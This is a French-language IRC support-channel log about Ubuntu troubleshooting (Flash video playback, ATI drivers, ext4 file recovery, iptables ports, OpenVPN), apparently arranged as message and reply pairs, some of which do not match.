ok et du coup pour faire un "paste" c'est une commande irc ?	Par contre, je ne sais pas t'aider pour dnsmasq.
je découvre un peu irc	Quand tu colles plusieurs lignes dans un salon, ça te rend muet.
;; MSG SIZE  rcvd: 95	Utilise un paste.
ha non, surtout pas, car pas certain de pouvoir me l'enlever !!	Oui, évitons les risques. Je pourrais tester mes droits en quiet. ;-)
mais merci quand meme :)	Marche pas les bans. :-(
Marche pas les bans. :-(	essaye sur moi
il lui faut un ban clache	Ok, je tente.
!ops	Tu test uBOTu-fr ?
+1 mezen	merci je vois que je ne suis pas le seul qui a remarqué sa longue absence
:)	tu m'as manqué
:(	et le probleme n'est pas dans ton titre qui aurait des espaces en trop ?
*caps	je peut comprendre ta réaction, surtout en temps que modo, mais le caps lock borfs ;)
je peut comprendre ta réaction, surtout en temps que modo, mais le caps lock borfs ;)	je me suis excusé, et je fais ca en faisant trois choses en meme temps, plus miam time … mais si tu veux je peux me focaliser sur le probleme à 100% (indice: ca va pas durer longtemps)
je me suis excusé, et je fais ca en faisant trois choses en meme temps, plus miam time … mais si tu veux je peux me focaliser sur le probleme à 100% (indice: ca va pas durer longtemps)	pas vue oups :)
ah, merci à vous, je vrais creuser	Calinou, Flo_K, alexises : POUR CAUSER WINDOWS,ALLEZ SUR ##WINDOWS, OU CREEZ ##WINDOWS-FR, MAIS ICI C'EST PAS LE LIEU
Et bien, je voudrai savoir si on peut installer un programme sans qu'il soit détectable, par un désinstallateur, ou en le cherchant manuellement. Bref, invisible	installe une version portable du logiciel
Bonjour. A t on le droit de poser une question sur windows ?	tu peut virer la desinstallation du menu je sais :)
c'est pas #windows-fr ici	d'accord je comprends. merci quand même. il faut que je trouve un tchat windows, si ça existe (lol)
coucou	o/
là ▶ paste.ubuntu-fr-secours.org/	http://paste.ubuntu-fr-secours.org/src-147017
des utilisateurs de conky dans le coin ? :)	pose ta question... ça ira plus vite :)
c'est l'école 42, il y a pas de prof	y a que des élèves ?
à pres le screen a été fait sur mac, c'est peut-etre pour ça non ?	sans doute
oui mais c'est une question d'affichage sur le terminal	il y a deux formats selon la date des fichiers
ça viens d'ou alors, car j'ai tout essayé, sans succès	 ls --full-time
je crois que Oleti à compris :)	la date du fichier correspond à la valeur que tu as fourni
je sais pas si j'ai bien expliqué le soucis	 c'est pas un soucis de touch (bis)
chiotte ;-)	t es expert en touch toi?
t es expert en touch toi?	je ne vois pas où est son problème
la commande "touch" :)	 c'est pas un soucis de touch mais d'interpretation du terminal
y a t'il un spécialiste du terminal, de "touch" plus precisément dans le coin :)	ppeux-tu être plus précis ?
oki	oui
oui	 https://forum.ubuntu-fr.org/viewtopic.php?id=861411
mais une carte graphique de merde intégré... Genre intel hd graphic	Je joue à Minecraft aussi avec les paramètres de base + 160 mods, (j'ai 8Go de ram aussi) ça ne me pose pas de soucis ... Après tu peux toujours jouer avec ... Atta un instant
Donc j'utilise comment Ulimite	 donc tu as la limite avec ulimit et celle avec java
Ah d'accord	  ha si, tu peux jouer avec ulimit
qu'il peut*:)	Bah c'est l'OS qui gère
Bonjour, savez-vous comment je peux augmenter la ram aloué envers un programme, ou ubuntu se charge déjà de maximiser autantqu	 ubuntu s'en charge
celui-là	 pourquoi tu ne mets pas qarte c'est top
lesquelles ?	 non je dis des conneries
mais pas dans les dépôts	hélas...
même pas , en fait on ne peut ajouter que des vidéos	pour la musique, j'utilise rhythmbox
pour la musique, j'utilise rhythmbox	 tout ce qui gère les bibliothèques type rhythmbox je n'aime pas , mais je crois que faute de mieux je vais y revenir
3.14.2	 tu utilises totem habituellement ?
je me demande pourquoi ils ont viré cette liste, c'est pénible et inutile puisqu'on pouvait la mettre ou l'enlever avant	quelle version de totem ?
quelle version de totem ?	 celle fournie avec ubuntu 15.04 donc je suppose la dernière
!wiki dmidecode	http://doc.ubuntu-fr.org/connaitre_son_materiel | http://doc.ubuntu-fr.org/carte_mere | http://doc.ubuntu-fr.org/macpro | http://doc.ubuntu-fr.org/flasher_le_bios | http://doc.ubuntu-fr.org/ocs_inventory
il n'était pas censé me retourner l'emplacement du fichier ?	ça va te plaire, ça ;-)
mais je vais chercher	uniquement s'il trouve le mot-clé
après le grep ne me renvoie aucun fichier	c'est normal : la directive n'y est pas, par défaut
ou est ce que je pourrais trouver un .deb de firefox 36 ou 37 ?	http://sourceforge.net/projects/ubuntuzilla/files/mozilla/apt/pool/main/f/firefox-mozilla-build/
et j'utilise le pilote graphique recommandé	est un pilote propriétaire ou libre ?
bonjour, quelqu'un pourrait il me donner son avis sur un problème d'affichage sur kubuntu 14.04?	ça dépend, décrivez le problème
J'ai pas trop d'idées :(	t'as FORCÉMENT installé un paquet tiers
thomas@thomas-desktop:~$ sudo apt-get install -f Reading package lists... Done Building dependency tree        Reading state information... Done 0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.	tapes sudo apt-get install wine
tiens-moi informé :)	malheureusement pas de changement
est-ce que le forum ubuntu-fr marche chez vous ?	oui il fonctionne
dpkg-reconfigure peut t'aider	ok merci je test
argh, désolé, je ne serai pas d'une grande aide...	pas grave
d'apporter une solution aussi	tu peux essayer de télécharger le paquet en .deb
la preuve	merci
je cherche toujours de mon coté	t'as quelle version ?
merci	je sais pas
je sais pas	ok
à noter aussi : "You cannot specify more than 15 ports (ranges count as  2  ports, so the port count in the above example is 4)."	ports séparés et range de X à Y. c est ca. faut juste que je modifie le range de destination
c est possible de configurer son routeur epuis les lignes de commande ?	on ne sait même pas de quoi tu causes
es que c est possible de definir plusieurs port dans une regle ? aulieu d une tranche. si oui comment l ecrire ? facon 123;124;125-133;134...	c'est un salon de support pour ubuntu, par pour les routeurs, si tu as une question précise demande à ton FAI si c'est lui qui t'a fourni le routeur
mais es que c est possible dans les reglages routeur ?	tu veux pas plutôt répondre à nos questions ?
facon 123;124;125-133;134...	-m multiport --dports 22,80,443,8080,...
je veux dire sur d'autres machines ?	en fait, le certificat du site est foureux :).
alexises : pourquoi ça marche ailleurs ?	en http, ça fonctionne
j'ai aussi pensé à un problème serveur, mais ça fonctionne sur mes autres machines	ca viens pas de toi, c'est le site qui a un soucis :)
arf	ou le captive portal
193.52.104.60	ho, toi tu es sur du wifi universitaire
code d'erreur : ssl_error_bad_cert_domain	nslookup forum.ubuntu-fr.org
ok les fichiers de config sont copié	ma note d'install perso : http://blog.garamotte.net/posts/2013/09/01/fr-openvpn-Client.html
au niveau de la sécurité ?	étrange, ça fonctionne en http chez moi
Damomo : fais sudo nautilus pour avoir accès en mode graphique	la conf par défaut proposée par les paquets openvpn et la doc officielle explique aussi comment mettre un unique VPN en place sur sa machine, sans penser qu'on pourrait en vouloir plusieurs
c est bien compliqué	boh, non, pas si compliqué
Personne pour moi :-(	comment ça "plus d'accès" ?
Je pensais que tu avait déjà fait une petite recherche avant	la doc ne parle pas du /etc/default/openvpn parce que c'est "all" par défaut
:/	essaie : cd ~/.config/autostart
@Marmotte, je veux vien annuler, mais comment j annule ?	je ne sais pas ce que tu as fait, je n'étais pas là, et je n'ai pas tout lu
Autostart, comment je rentre ans le repertoire	annule tout ce que tu as fait jusqu'à présent
Bonsoir, j'ai 2 écrans brancher sur ma carte vidéo maisil me renvois la même image, quel logiciel utiliser sosu mon xbuntu pour   gérer  2 écrans  ?	Try arandr
il est pas installé par défaut sur tous les environnements GNOME, Garrick1 ?	je ne suis pas sous gnome
(19:26:31) Almenura: bonjour, je cherche un assisatance d'urgence // essaye le 100	je cherche une nouvelle ref :)
c'est gentil de ta part, pour info je suis sysadmin de metier, du coup on peut passer rapidement à l'etape superieur ;)	tu m'intéresses
le fichier :(	tu fait tout en utf8
que j'ai installé (JMeter), pas l'exécutable ! Le dossier !	la liste des fichiers installés par le paquet est là : http://packages.ubuntu.com/vivid/all/jmeter/filelist
ensuite, comment as-tu fait l'install ?	je cherche son dossier car j'ai fabriqué un installeur avec IzPack et l'installeur modifie des fichiers de propriétés, deuxième question CF réponse d' alexises
je cherche le dossier d'une application	tu l'as installer par les dépots ?
tu l'as installer par les dépots ?	 je l'ai installé par la bibliothèque
quelqu'un pourrait m'aider s'il vous plaît ?	la première question, c'est pourquoi tu cherches son dossier ?
(pouvoir booter dessus)	grub2 est bien plus sympa dans ce rôle
grub2 est bien plus sympa dans ce rôle	si t'as une petite documentation sympa qui accompagne tes écrits, je suis preneur alors
si t'as une petite documentation sympa qui accompagne tes écrits, je suis preneur alors	il faudrait que je retrouve ça, et que je le mette sur mon blog, j'avais un peu galéré, mais je préfère ma clé USB de boot depuis qu'elle utilise grub2 :)
restricted extras oui :)	l'eula de microsoft, c'est juste pour indiquer que tu sais que c'est microsoft qui t'offre gracieusement l'utilisation des 7 fonts web arial, verdana, …
après avoir installé les restricted area ca marchje !	ca installe tous les codecs/fonts dont les droits ne sont pas completement libre, et c'est le cas pour une partie des formats acceptés par le w3c
ouais, donne-toi au moins la peine de faire un lmgtfy quoi :>	il me semble que la charte fais les gros yeux sur lmgtfy
apparemment le pb venait de là !	content pour toi :)
apt-get google	c'est un salon de support, si c'est juste pour ca, c'est pas le bon salon, cf /topic
Allo, connaissez-vous un lecteur de Epub en ligne de commande? :)	http://bit.ly/1HbD85s
haha	c'est pas comme si microsoft etait contributeur du noyau depuis quelques années … "ha ha"
non	sudo apt-get install --reinstall ubuntu-restricted-extras
j'aimerais bien savoir pourquoi et s'il le faut réinstaller :(	tu as installé le paquet ubuntu-restricted-extras comme te l'a suggéré avelldiroll ?
adobe ne fournit plus de plugin flash pour linux, sauf pour chromium avec le pepperflash plugin	il a relancé son navigateur sans plugin :)
j'ai du cocher une option et maintennat j'ai un autre message	c'est soit un souci avec les restricted-extras ( je doute), soit un souci avec un plugin (plus probable), pour tester ca il faut tenter une lecture des videos dans une fenetre privée ou en desactivant les modules externes comme te le suggere Marmotte depuis 15 minutes
la vidéo qu'il cherche à visionner est peut être mal encodée ?	la vidéo qu'il essaie de lire fonctionne sur ma machine, avec Firefox 37.0 aussi
j'ai vu un problème de type mime	c'est pour ca que plusieurs personnes t'ont dit de backloguer, là on tourne en rond sur un faux probleme
je connais même des dev flash qui se sont reconvertis surtout :p	tss
recommande*	c'est pas la question, on est embourbé dans un non probleme … les problemes de nyou ne sont pas liés à flash, mais pour le savoir il faut backloguer
moi je force flash sur youytube, le elcteur html5 étant instable	parce que monkey patcher de maniere non officielle un plugin abandonné sur un logiciel qui peut s'en passer c'est une vraie solution ?
c'est de la non-solution	c'était le cas il y'a quelques années ça
sous-traiter*	ah non, c'est une solution parfaite, au contraire
mais on reste sur firefox	non, car Adobe Flash est officiellement déprécié sous toutes les plateformes à part Windows
si tu connais déjà la réponse à ta/tes question(s), tu es sur le mauvais channel :þ nous sommes ici pour t'aider	Exagone313 : la meilleure solution étant de le supprimer, on a pas besoin de s'embêter à chercher comment l'installer ou le mettre à jour :D
avec version canonicall 1.0	alt+e pour afficher le menu "Aide", puis "Redémarrer, modules désacivés"
marmotte, je peux le virer en passant par le termin al ?	quelle version de Firefox ?
genre... de 2min	je ne parle pas de flashplugin-installer
j'avais fait un clicl droit	oui, avec sudo apt-get purge flashplugin-installer
je connais quelqu'un qui connaît la manipulation, je sais pas si c'est celle de la doc	backlog
mais je ne conseille qu'en cas d'aucune autre solution...	normalement, la solution, c'est de le virer, pas de l'installer ^^
:)	sur ta vidéo, le menu contextuel (clic droit) parle de flash, ou pas ?
il y a des solutions alternatives ?	flash est inutile depuis quelques temps déjà
et si je ne veux pas de chromium ?	quand tu fais un clic droit sur la vidéo, tu as un menu contextuel qui parle de flash, ou celui du navigateur ?
je l'oublie toujours que ca flingue tous les plugin :)	j'ai parlé de session privée, pas de relancer sans plugins (ça, c'est l'étape suivante ^^)
il faudrait le lien direct vers la vidéo, pour voir si tu y as accès, déjà	c'est un lien akhamai, je doute que ce soit bloqué
c'est un lien akhamai, je doute que ce soit bloqué	ou en session privée
ou en session privée	+1
moi non plus je ne sais pas	si tu utilises firefox, teste avec cromium (et inversement)
il y a une commande par le terminal ?	je viens d'aller voir, la vidéo fonctionne chez moi, et je ne sais pas d'où peut venir l'erreur :/
(et j'ai déjà résolu des soucis de ce genre en virant juste flash)	c'est pour ca que je precise
avec ton gestionnaire de paquets	sur la page en question, c'est pas du flash, c'est du .mp4 dans une balise <video>
sur la page en question, c'est pas du flash, c'est du .mp4 dans une balise <video>	j'avais parlé de flash avant d'avoir le lien :)
je ne sais pas mais en tout cas, je n'y ai plus accès	si tu as flash, ou un substitut installé, retire le :)
le type MIME  ou format MIME n'est pas géré ?	dans quel contexte, ces vidéos ?
Ah oui j'ai découvert ça ^^' 1.5.6 apparemment	sudo easy_install pip==1.5.6
    load_entry_point('pip==1.5.6', 'console_scripts', 'pip')()	faut pas coller ici, sinon uBOTu-fr se fâche, et il t'empêche de causer
(Ah oui, j'oubliais : je pense tout de même avoir réussi à déinstaller le fameux module, sachant que si j'ai eu l'idée de déinstaller Python c'est parce que pip, qui venait d'installer ce module, ne voulait plus marcher, ne voulait plus me le supprimer)	reinstall d'abord pip et installe qlq truc avec pour voir si c'est pas pip qui pause probleme.
rebadgé ?	renommé
(sinon, c'est pas Google Shopping ici)	merci
Voila, je voudrai acheter un ordinateur portable en France. Caractéristique: CPU: core i5, RAM 8Go,... Quelqu'un peut me guider un peu. Sur quel site est-ce que je peut me connecter. Merci d'avance.	www.dell.fr
comment peut on les décompiler ?	avec ar et tar: ar p package.deb data.tar.gz | tar xzf
Bonsoir j'aimerais installer un logiciel (inskape) sur mon xbuntu mais je sais pas comment faire.	En mode console tu tapes "sudo apt-get install inkscape"
je dis que si il voit un secteur defectueux et qu'il l'isole, que va t il advenir du reste du fichier	Dans l'état actuel des choses, mon ancien disque du je n'ai rien à faire des données dessus. Et comme je viens de le formater à priori il n'y a aucun fichier dessus.
le formatage ne posera pas le soucis du fichier corrompu quand il trouvera des secteurs defectueux	Tu veux dire qu'avec e2fsck il essaye de récupérer les fichiers corrompus ? Mais si il n'y en a pas il fait quoi ? ^^
je ne l'ai pas vu dans le man	Ca ne me dérange pas du tout de formater (je viens de le faire de toute façon)
tu peux faire un badblocks et apres un mke2fs , je ne sais pas si tu peux faire le mke2fs sans formater	option -c de e2fsck
Bonjou j ai Lubuntu d'instalé, cela fonctionne bien, mais quand j'éteind ou que j alume le pc cela me marque softreset failed not ready, mon PC est un amd athlon 64 scaléo j merci	t'as jeté un oeil à ce topic ? http://forum.ubuntu-fr.org/viewtopic.php?id=1143061
le problème c'est que pour le chemin absolue du deuxième paramètre	le rapport avec Ubuntu ?..
dans /bin ?	type -p jmeter
type -p jmeter	 ce n'est pas le dossier
14.04.02	Est-ce que tu as utilisé chiffrement?
ah	Nous pouvons les voir, tes messages
c'est beaucoup plus fiable que de se contenter d'installer et désinstaller tout le temps	rien de mieux pour comprendre que de tester : https://www.docker.com/tryit
rien de mieux pour comprendre que de tester : https://www.docker.com/tryit	 pour Eric__  je suis à court d'idée
?	aucune idée, faut tester
ou au système à votre avis ?	\x échappe x, \\x échappe \ , ce qui résulte en \x
\x échappe x, \\x échappe \ , ce qui résulte en \x	à votre avis ? \\ suffirait ,
donc je me demande, si c'est dû au système, ou plutôt à ce que JMeter veut !	c'est normal, car dans la chaîne tu dois échapper le \ pour qu'il soit bien présent
faut que je fasse une instance de File non ?	ah oui par contre faut utiliser une classe qu'encapsule la gestion du path, oui
depuis le 17 juillet 2014	 re désolé pour mon retour tardif
Oui, je viens de voir ça.	EOL
(Ubuntu 13.10)	c'est pas que 13.10 est plus supportée ?
sudo aptitude reinstall apache2	je suis totalement à la ramasse sur ubuntu ^^.
je sais que les installations sont faite via aptitude et le wordpress tourne avec codeigniter	tu peux paster la sortie de ls -l /etc/init.d ?
voilà ce que ça donne :  http://pastebin.com/DifNxwpR	àmha, tu as d'autres soucis que celui d'apache2 là
àmha, tu as d'autres soucis que celui d'apache2 là	oui justement j'ai retrouver un peu d'infos sur l'installation et j'ai quelques piste de réflexion mais rien de trés concluant
comment puis je vous apporter plus d'info ?	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
)	 voilà ce qui en sort :  apache2: unrecognized service
elle n'est même plus trouvé sur le server malgré sa présence	au finale que cherches tu à faire/savoir ?
Dites, par rapport à Steam. J'ai un PC portable sur ubuntu 14.04, avec deux sessions administrateur. Est-ce que c'est normal que je doive retélécharger deux fois les jeux (1 fois par session?)?	Steam télécharge les jeux dans le homedir de l'utilisateur, donc oui, c'est normal
?	apt alias de apt-get t'es certaine?
apt update suffi et est plus sympa à voir	ça a marché au début, pourquoi ça marchera plus
tu crois que cela ne vins que de la ?	le pilote inconnue c'est un pilote pour ton processeur, il est là depuis 15.04 donc tout nouveau
non personne ? il est si naze que cela mon post ?	réinstalle ton système et n'installe pas le pilote inconnu
parce que, dans cette logique là je peux faire payer l'unban	^^, c'est logique en effet :)
donc oui, si tu offres quelque chose en retour :)	tu fais payer le support ?
les référentiels de l'enseignement supérieur restent à peu près neutres mais ça veut pas dire en pratique qu'ils utilisent du libre souvent	cela reste des référentiels
et pe microcode.ctl aussi http://packages.ubuntu.com/search?keywords=intel+wifi&searchon=all&suite=all&section=all	j ai installer ce que m'as conseillée. je viens de rebooter. "croise les doigts" :P
PS : le principe de priorité du logiciel libre dans l'éducation a également été supprimé au début de cette année	j'arrive en cours de discussion, donc j'ai pas tout suivi, mais tu parles pas du supérieur hein ?
enfin ça date un peu déjà	http://code-industry.net/get.pdfeditor.php
avec xpdf ?	je ne juge pas l'aspect du logiciel
on a déjà fait le tour	cela signifierait qu'evince a rattrapé son retard
pent0thal ben oui sérieux	même avec xpdf ?
les formulaires ?	migrer...
les fichiers pdf ont un bouton qu'il faut cliquer pour que le formulaire complété soit envoyé à l'organisme qui fournit les subventions	oui mais ils viennent d'où ?
les salaires de 5 personnes de l'asso en dépendent	pirate une VM sous XP via plusieurs vecteurs, tu peux le faire c'est pas très complexe
si la machine n'utilise pas internet ?	c'est pire en local, c'est facilement faisable en ligne
les deux	t'as lu ce qu'on dit depuis tout à l'heure ou tu dis ça pour compléter ?
j'ai Archlinux et Bento Openbox ^^	ce n'est pas dit : il y aurait pas mal de boulots pour des petits artisans ;-)
cela dit, j'ai des machines avec des windows qui passent entre mes mains, et XP ou Vista ou Seven, quand y'a plein de cochonneries c'est le même boulot à nettoyer ^^	après tant d'années depuis son apparition, il y a de très faibles chances que XP inclut encore des 0 days
mezen SurcouF les 0-day	le rapport avec ce que l'on a dit ?
le rapport avec ce que l'on a dit ?	la sécurité
la sécurité	on parlait de la fin du support de Windows XP, mais je ne vois pas le rapport
tes propos...	je comprends pas non, quel rapport entre les 0 days et win XP ?
excusez moi	moi aussi dans ce cas
http://windows.microsoft.com/fr-fr/windows/end-support-help	tu devrais t'intéresser un peu plus à la sécurité informatique.
tu devrais t'intéresser un peu plus à la sécurité informatique.	en quoi mes propos impliquent que je devrais m'interesser à l'a sécurité informatique?
depuis il l'a vendu à un gars qui apprécie bien, en voyage (il s'est acheté un smartphone à la place)	Bento ?
c'est évident qu'utiliser Win XP est recommandé...	pourquoi donc?
SurcouF Xp pro c'est pas si mal que cela pour des utilisation limiter sur un pc qui a pas  de puissance (eepc)	mon eeePC était fourni avec Windows 7...
lance	tu devrais donc lire
salut mezen	salut
suicide*	tu dis n'importe quoi en fait
-t	utiliser Win XP est du cyber suicide lol
mon pc de jeux est sous XP pro	qui a osé conseillé NTFS pour /home ?
et un xp	XP???
personne ne vois mon probleme ?	tu veux dire btrfs?
rtfm -)	http://www.mankier.com/?q=-)
stp *	prend le temps de lire et comprendre
et pour mon probleme ?	tu donnes les bonnes sources
cette page la aussi ? http://doc.ubuntu-fr.org/catalyst	la solution y est expliquée
15.04. ati radeon hd 7770 1 go	quelqu'un devrait pouvoir t'aider, ne soit pas si pressé
merci davoir essayé de m'aider	...
pent0thal : aticonfig --initial ?	demande à quelqu'un d'autre car je n'en suis pas certain
pent0thal *	la solution à ton problème
bon ubuntu ne marchera pas sur mon pc dommage	relis
et j'ai un ecran noir au démarrage et il est bloqué	commence par lire la documentation dans le lien
Voilà je vient d installer / redémarrer et j'ai un ecran noir	tu as installé "flgrx"? http://doc.ubuntu-fr.org/catalyst
apres avoir desinstallé le pilote amd	*
ati radeon hd 7770 1 go	tu dois installer le paquet "fglrx" depuis le gestionnaire de paquets
je suis passé en recovery si tu veux que je fasse quelque chose	AMD?
je suis sur un fixe	donne les caractéristiques de ta carte graphique
ça fait juste 3h que je galère, que je formate, change d'OS, pour résoudre le problème en... rebootant la box !	lol
que me conseillez vous entre fglrx et fglrx-updates ?	je suis justement curieux de connaitre la différence:p
et je comparais le pilote libre au pilote propriétaire	il est plus performant sur les cartes où c'est le seul choix dispo, vu que le proprio et le libre sont maintenu par amd maintenant
le pilote recommandé est déjà coché (j'ai installé le système ce matin donc je me souvient des choix)	si le pilote recommandé n'est pas le pilote proprietaire, c'est probablement parce qu'il y a un souci avec le modele de ta carte et la version du pilote proprio dispo dans les depots
mais je voulais installer steam sur le système	l'interface te le dira
en gros je dois : installer ubuntu / le mettre à jour / et après avec le gestionnaire de pilote j'installe fglrx ou fglrx-updates ? c'est ca ?	choisi le pilote recommandé
j'ai fait une vingtaine d'installation ces 3 derniers jours sans succès	installe ubuntu 15.04 ou 14.04, et on reparlera
le pilote propriétaire	oui, à moins d'avoir des résidus d'un pilote mal installé ou qui ne fonctionne pas
ubuntu, xubuntu, elementary os, mint (mais tous basé sur ubuntu si j'ai bien compris)	xubuntu c'est une variante officielle mais pas les autres
j'ai essayé avec un système de base (fraîchement installé) et aussi avec les maj	que sur ubuntu ou aussi d'autres ditrib ?
vous avez déjà eu des problèmes similaire avec les pilotes ATI ?	question bete, ton système est a jour ?
je peux tester sur elementary os dernière version ou je dois changer de distrib ?	bah je connais pas elementary os pour affirmer que c'est pareil que ubuntu
et tout se passe au démarrage	tu vois meme pas le splash screen ?
j'ai qu'un seul ordi	si t'as un Xorg.conf, renomme le
le problème est que je ne peux pas être sur ce tchat et tester en même temps :/	pourquoi ?
et si je passe pas le recovery mode et je le supprime le système redémarre	non, bien chargé
au début je ne regardais pas beaucoup les erreurs mais c'est Xorg qui fait des erreurs	et puis, t'as regardé si le pilote est bien chargé ?
et puis, t'as regardé si le pilote est bien chargé ?	bien chargé ? il est bien installé
oui c'est une HD 7770 et elle est dans la liste des cartes "compatibles"	il démarre plus, t'as un écran noire au démarrage et tu dois l'éteindre au bouton ?
je ne sais pas si ca peut jouer mais j'ai 3 écrans. 2 sur ma carte graphique ATI et 1 sur le processeur	et t'as regardé si erreur loggée ?
j'ai essayé via pilotes additionnels et aussi les versions présentes sur le site d'AMD	t'es certain que ta carte figure bien dans la liste du matériel supporté par le pilote ?
il y a un mini exemple avec les racines binary et source	je l'ai survolé cette doc, mais il me semble pas qu'il soit expliqué s'il y a un standard pour les "components"
Bonjour, cela fait 4 jours que j'essaye d'installer le pilote ATI constructeur sur la dernière version de plusieurs distrib (ubuntu, xubuntu, elementary os, mint) 64 bits et a chaque fois que je redémarre le système ne veut plus démarrer. Vous avez des idéees ?	tu l'as installé via pilotes additionnels ?
ah ok c'etait ton fantasme :p	oui c'est la classe la moustache
oui c'est la classe la moustache	https://www.debian.org/doc/manuals/repository-howto/repository-howto
:p	en vrai je suis pas moustachu :)
merci pent0thal !	tu as une clé USB je suppose?
la je sens que je commence à me faire bien voir... :)	ça devrait le faire, laisse moi lire la doc
Mais en anglais, sorry.	ça devrait aller, je suis prof d'anglais ;)
et la carte a déjà fonctionné...	la solution est ici http://ubuntuforums.org/showthread.php?t=2103062
merci pent0thal, mais j'ai un peu de mal à tout saisir... je crois que mon problème est plus complexe que ce que mes capacités me permettent de résoudre	sais-tu utiliser la ligne de commande ?
n'hésites pas à poser des questions, je suis sur que tu as les capacités pour résoudre le problème	+1
est-ce que quelqu'un peut m'aider svp ?	http://doc.ubuntu-fr.org/wifi_problemes
:/	si t'as un probleme, tu n'hesites pas
quelqu'un connaiterais pas un chan de discution ?	pour discuter d'autres choses que du support, merci de taper /join #ubuntu-fr-offtopic
ou pas ...	le sms est prohibé sur le channel :)
mais mnt g ma reponse	t'auras pas mieux. Si tu as une question, pose-là, elle sera lue, et si quelqu'un sait il t'aidera..
pas tout le monde linux	elementary est basé sur ubuntu ; c'est pourquoi je pensais avoir un peu d'aide ici
bonjour, je viens d'installer elementary os et je ne parviens pas à faire deux choses : configurer mon imprimante (brother dcp j315W) et installer tweaks... est-ce que quelqu'un peut m'aider svp ?	si tu le sais pas encore, ce canal est pour ubuntu et ses variantes officielles
Salut, savez-vous comment je peux réinitialiser mes polices d'écritures sur Ubuntu? car je suis pris avec ce type d'écran... http://www.hostingpics.net/viewer.php?id=845719bugfirefox.png . J'ai également entré cette commande, et ça n'a rien changer au problème mv .mozilla .mozilla.bak	essai un coup de "sudo apt-get install fonts-liberation" au cas ou, mais je vois pas pourquoi ff choisirais pas une autre font si celles là sont pas dispo d'origine
a bas la dictature !	ça faisait un moment qu'il s'amusait sur ce salon et un autre
ça faisait un moment qu'il s'amusait sur ce salon et un autre	ah bon, je ne savais pas, il a pourtant essayé de m'aider
tu fais comment pour voire tes mails B ?	tu fais le perroquet?
bah	et bien je me connecterai sur le compte B
et bien je me connecterai sur le compte B	aucun rapport avec ubuntu, sinon https://support.google.com/mail/answer/10957?hl=fr
je voudrai juste avoir une alerte mail j ene veux pas rediriger	aucun rapport avec ubuntu, sinon https://support.google.com/mail/answer/10957?hl=fr
bah tu demande de changer l'addresse de destination vers ta boite B	comment fait on ça avec gmail ?
?	si, c'est la meme personne, qui ne realise pas qu'un banevad, en general ca fini en ban du server, aps du salon
c'est mieux que tetfdg	tu es skyzophrene ?
quoi ?	suffit pas de changer ton pseudonyme pour être anonyme sur freenode
pourquoi ?	c'est terminé ?
si il est ban, il peut plus revenir ?	si il peut revenir si il change son ip (le ban c'est sur *!*@2001:910:1353:1:*)
?	tape /quit
mezen les autres outils tel que extundelete	tu l'as essayé ?
Mezen  pour déterminer le nom des répertoires et des fichiers.le inodes sont utilisés dans ext4 je crois	photorec/foremost ne déterminent pas les noms des fichiers/dossiers supprimés
mezen oui dans le cas dun fichier. mais dans le cas d'un inode ext4?	l'inode va être écrasé mais il pointera vers de nouveaux offsets
Mezen: oui le meme inode. mais est-ce cette inode va etre écrasé vraiment a le meme place  sur le disque.le meme secteur?	à priori, un fichier créé du même nom va utiliser un secteur différent
Mezen: EX  tu as un répertoire  ///racine/ avec des fichiers et sous-répertoires... tu l'effaces..  linux garder une trace  de cette inode effacé pour rep  /Racine/.... mais si plus tard tu crée un rep du meme nom  /racine/  est-ce qu'il va écrasé lancien inode sur le meme secteur du disque?	là je sais pas, aucune idée
 mezen mais est-ce quils peuvent lire des inodes... effacés?   d'ext4?	oui ça va utiliser le même inode du dossier écrasé
 en exemple, juste en tapant "récupération disque dur" sur google: http://www.ontrack.fr/recuperation-disque-dur/	mais est-ce  que cela fonctionne si les inodes sont disparus d'ext4..   ?   alors on se retrouver avec fichiers sans nom..et aucun rep..
mais est-ce  que cela fonctionne si les inodes sont disparus d'ext4..   ?   alors on se retrouver avec fichiers sans nom..et aucun rep..	tu peux tester avec la commande "df -i /dev/sd(lettre)"
Mezen ces outils de récupération par signature demande beaucoup de temps et patiences..à ce que je vois... ..est-ce qu'il existe des outils efficaces pour cibler les dossiers  d'une partition ext4..?	je ne connais vraiment pas le taux de réussite, les professionnels utilisent des méthodes en laboratoire pour lire piste par piste le disque
oui mezen .. on dirait quel navigation.. temp..sest vraiment enregistré à la mauvais endroit.. ? ou as-tu navigué   beaucoup?   ou cest vraiment  pas de chance..sur 80gb..tout tes fichiers navigations ont éliminé 95 0e ton rep	oui, il existe des boîtes et des professionnels, le service est cher
mezen PArtition ext4? tu as supprimé le dossier... et ensuite.. tu nas pas fait dautre manipulation?   quel est le pourcentage de récupération de ton dossier? tu as essayé extundelete	ça serait plus simple si les outils de récupération ciblent un dossier, mais c'est pas le cas. ils ciblent toute la partition
mezen et combien d'utilisation sur 80gb?	mon disque n'est pas neuf, après 4 ans dessus, aujourd'hui 6 ans, les fichiers de navigation sont trop nombreux
mezen cétait une partition de combien d'espace	j'ai pas pu récupéré tous les pdfs (manuels, documentations, factures, etc). J'ai pu récupérer quelques mp3. Les images/photos sont irrécupérables (résultat pollué par les fichiers temporaires de navigation chrome/firefox)
avelldiroll mais testé  ou faire plusieurs scans..avec 10 outils...cela rallonge le nombre de scan...surtout si ta partition est pas petite.. 2TB  5TB , etc  alors cest plus pratique de tester avec un nombre limité doutil efficace pour réduire le temps totale de récupération	moins de la moitié
avelldiroll oui , cest sure.. mais je cherche loutil le plus versatile.. dans nombreuses situations et types de fichiers	80 Go par là
mezen est-ce que tu avais écris sur le disque.. avant de tenter la récupération avec photorec	oui mais pas beaucoup
mezen oui  cest une question pour ceux qui ont  comparé  pas mal  tous les outils principaux disponibles..	quel est l'interet de la question ?
C'est juste le premier chan où j'suis tombé :p	tu peux en créer un juste pour cela
mais tu as aussi d'autres protocoles	je sais pas quoi filer a des users windows qui veulent up du html pure
Ya des outils pour créer façilement des users FTP qui arrivent sur /www/ et peuvent seulement uploader là tout en créeant des fichiers appartenant a www-data?	dans le temps, il y avait pure-ftpd
Et dans onglet, tout est coché sauf le dernier	ceci dit on est daccord hein, t'as pas d'extentions louches activées (genre no script) ?
!quit	fail
fail	je test un bot :p
En passant tout fonctionne bien sur chrome	preferences onglet contenu, tu vois quoi ?
Comment je fais pour rafraichir mes polices d'écritures?	ferme ton ff, fait un "mv .mozilla .mozilla.bak" et regarde si t'as toujours le soucis
ublock c'est genre une sorte de adblock?	pb de fonts ?
